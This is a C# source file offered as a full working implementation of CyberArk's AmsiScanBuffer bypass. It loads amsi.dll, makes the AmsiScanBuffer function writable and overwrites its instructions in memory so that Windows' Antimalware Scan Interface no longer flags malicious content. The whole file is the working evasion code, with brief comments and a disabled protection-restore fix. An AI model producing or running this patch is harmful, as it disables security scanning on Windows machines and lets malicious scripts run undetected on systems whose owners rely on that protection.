//Author: Cyber Ark, The Wover
// Full working program for Cyber Ark's AmsiScanBuffer bypass: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/

using System;
using System.Runtime.InteropServices;

namespace AMSIBypass2
{
    class Program
    {

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, Int32 dwSize, Int32 flNewProtect, IntPtr lpflOldProtect);

        static void Main(string[] args)
        {
            Console.WriteLine(run());
            
        }

        public static string run()
        {
            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null) return "error";

            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
            if (AmsiScanbufferAddr == null) return "error";


            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, 0x40, OldProtection);
            if (VirtualProtectRc == false) return "error";

            //The new patch opcode
            var patch = new byte[] { 0x31, 0xff, 0x90 };

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);

            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
            MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);

            //MY FIX because I was getting an access violation when trying to run Powershell after this.
            //Restore the section to its original protection.
            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            //Use the oldProtection, then get the new protection and confirm it.

            //IntPtr NewProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection
            //VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, OldProtection.ToInt32(), NewProtection);
            //if (VirtualProtectRc == false) return "error";


            return "OK";

        }
    }
}